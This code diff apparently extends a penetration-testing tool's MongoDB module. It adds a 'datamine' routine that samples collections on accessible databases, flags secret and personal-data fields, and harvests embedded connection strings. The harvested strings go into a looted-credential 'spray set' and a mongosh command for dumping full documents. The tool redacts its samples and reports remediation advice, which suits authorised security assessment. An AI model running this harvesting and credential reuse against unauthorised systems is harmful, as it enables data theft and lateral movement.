@@ -14,6 +14,7 @@ write-ups, a dedicated **MongoDB** tab, and the prove engine.
 """
 from __future__ import annotations
 
+import re
 import socket
 import struct
 
@@ -280,6 +281,85 @@ def probe_creds(ip: str, port: int, user: str, password: str,
     return out
 
 
+def _flatten(doc, prefix: str = "", depth: int = 0):
+    """Yield (dotted_field_name, value) for a BSON doc, descending into subdocuments."""
+    if depth > 6 or not isinstance(doc, dict):
+        return
+    for k, v in doc.items():
+        key = f"{prefix}.{k}" if prefix else k
+        if isinstance(v, dict):
+            yield from _flatten(v, key, depth + 1)
+        else:
+            yield key, v
+
+
+def _batch(cursor_field):
+    """listCollections/find return cursor.firstBatch, which bson_parse renders as a dict
+    with numeric keys (arrays) or a list. Normalize to a list of dicts."""
+    if isinstance(cursor_field, dict):
+        return [v for v in cursor_field.values() if isinstance(v, dict)]
+    if isinstance(cursor_field, list):
+        return [v for v in cursor_field if isinstance(v, dict)]
+    return []
+
+
+def datamine(ip: str, port: int, dbs: list[str], timeout: float = _TIMEOUT,
+             user: str | None = None, password: str | None = None,
+             max_dbs: int = 6, max_colls: int = 12, max_docs: int = 3) -> dict:
+    """Read-only secret hunting across the accessible databases: list collections, sample
+    a few documents, flag fields whose name denotes secrets/PII (sampled REDACTED), and
+    harvest embedded connection strings. Uses SCRAM auth when creds are supplied."""
+    from .postgres import _CONNSTR, _SECRET_COL, _redact
+    out = {"secret_fields": [], "samples": [], "harvested": []}
+    try:
+        with socket.create_connection((ip, port), timeout=timeout) as s:
+            s.settimeout(timeout)
+            if not isinstance(_hello(s, 1, timeout), dict):
+                return out
+            if user and not _mongo_scram(s, user, password, "SCRAM-SHA-256", 50, timeout) \
+                    and not _mongo_scram(s, user, password, "SCRAM-SHA-1", 60, timeout):
+                return out
+            rid = 100
+            for db in [d for d in dbs if d not in ("local", "config")][:max_dbs]:
+                lc = command(s, bson_doc(_e_int32("listCollections", 1),
+                                         _e_str("$db", db)), rid, timeout)
+                rid += 1
+                colls = [c.get("name", "") for c in _batch(
+                    (lc or {}).get("cursor", {}).get("firstBatch"))]
+                for coll in [c for c in colls
+                             if c and not c.startswith("system.")][:max_colls]:
+                    fr = command(s, bson_doc(_e_str("find", coll),
+                                             _e_int32("limit", max_docs),
+                                             _e_str("$db", db)), rid, timeout)
+                    rid += 1
+                    if not isinstance(fr, dict):
+                        continue
+                    docs = _batch(fr.get("cursor", {}).get("firstBatch"))
+                    hit, sample = [], {}
+                    for doc in docs:
+                        for field, val in _flatten(doc):
+                            if _SECRET_COL.search(field):
+                                if field not in sample:
+                                    hit.append(field)
+                                    sample[field] = _redact(val)
+                            for m in _CONNSTR.finditer(str(val or "")):
+                                out["harvested"].append(m.group(0))
+                    for f in hit:
+                        out["secret_fields"].append(
+                            {"db": db, "collection": coll, "field": f})
+                    if sample:
+                        keys = list(sample)[:6]
+                        out["samples"].append({
+                            "db": db, "collection": coll, "fields": keys,
+                            "redacted": {k: sample[k] for k in keys}})
+    except OSError:
+        pass
+    seen: set = set()
+    out["harvested"] = [c for c in out["harvested"]
+                        if not (c in seen or seen.add(c))]
+    return out
+
+
 def _deep_mongo(sock, out: dict, timeout: float) -> None:
     """Read-only deep enumeration on an unauthenticated MongoDB: captured user accounts
     (+ credential mechanisms), replica-set members (lateral targets), and the on-disk
@@ -486,6 +566,34 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     "Rotate the credential; enforce least privilege / SCRAM-SHA-256; bind "
                     "to a trusted interface.",
                     ["CWE-522", "CWE-284"], kind="mongo_cred_access"))
+            dm = pr.get("datamine")
+            if dm and dm.get("secret_fields"):
+                sf = dm["secret_fields"]
+                colls = sorted({f"{c['db']}.{c['collection']}" for c in sf})
+                detail = (f"recce mined {len(sf)} sensitive field(s) across "
+                          f"{len(colls)} collection(s): "
+                          + ", ".join(f"{c['collection']}.{c['field']}" for c in sf[:12])
+                          + (" …" if len(sf) > 12 else "") + ".")
+                samples = dm.get("samples") or []
+                if samples:
+                    s = samples[0]
+                    detail += ("\n\nSAMPLE (redacted) " + s["db"] + "." + s["collection"]
+                               + ": " + ", ".join(f"{k}={v}"
+                                                  for k, v in s["redacted"].items()))
+                harvested = dm.get("harvested") or []
+                if harvested:
+                    detail += (f"\n\nHARVESTED {len(harvested)} connection string(s) -> "
+                               "spray set: "
+                               + ", ".join(re.sub(r":[^:@/]+@", ":****@", c)
+                                           for c in harvested[:5]))
+                out.append(_finding(
+                    "high", "MongoDB sensitive data exposed (PII / secrets / credentials)",
+                    tgt, detail, "mongosh",
+                    f"mongosh mongodb://{h.ip}:{p.portid}/ --eval "
+                    "'db.getSiblingDB(\"<db>\").<collection>.find().limit(20)'   # full docs (ROE)",
+                    "Encrypt sensitive fields; least-privilege the app role; remove "
+                    "embedded credentials; bind to a trusted interface.",
+                    ["CWE-200", "CWE-312"], kind="mongo_datamine"))
             if ver and _old_version(ver):
                 out.append(_finding(
                     "medium", "MongoDB end-of-life / legacy build", tgt,
@@ -542,17 +650,29 @@ def analyze(hosts: list[Host], creds: dict | None = None, active: bool = True,
                 continue
             # Credentialed follow-through: a reachable-but-locked instance is retried
             # with each supplied/looted credential (SCRAM-SHA-256/1).
+            acc_user, acc_pw = None, None
             if not pr.get("unauth"):
                 for u, pw in _cred_list(creds):
                     cp = probe_creds(t["ip"], t["port"], u, pw)
                     if cp.get("cred_access"):
                         pr = cp
+                        acc_user, acc_pw = u, pw
                         break
             probes[(t["ip"], t["port"])] = pr
             t["unauth"] = pr.get("unauth", False)
             t["cred_access"] = pr.get("cred_access", False)
             t["version"] = pr.get("version", "")
             t["databases"] = len(pr.get("databases") or [])
+            # Exfil: mine collections for sensitive fields + embedded creds.
+            if pr.get("unauth") or pr.get("cred_access"):
+                dbnames = [d["name"] for d in pr.get("databases", []) if d.get("name")]
+                dm = datamine(t["ip"], t["port"], dbnames, user=acc_user, password=acc_pw)
+                pr["datamine"] = dm
+                for cs in dm.get("harvested", []):
+                    looted.append(Credential(
+                        username="(embedded)", secret=cs, kind="password",
+                        source="mongodb-datamine", origin_ip=t["ip"],
+                        notes=f"connection string mined from MongoDB :{t['port']}"))
             for hh in pr.get("hashes", []):
                 looted.append(Credential(
                     username=hh["user"], secret=hh["hashcat"], kind="hash",
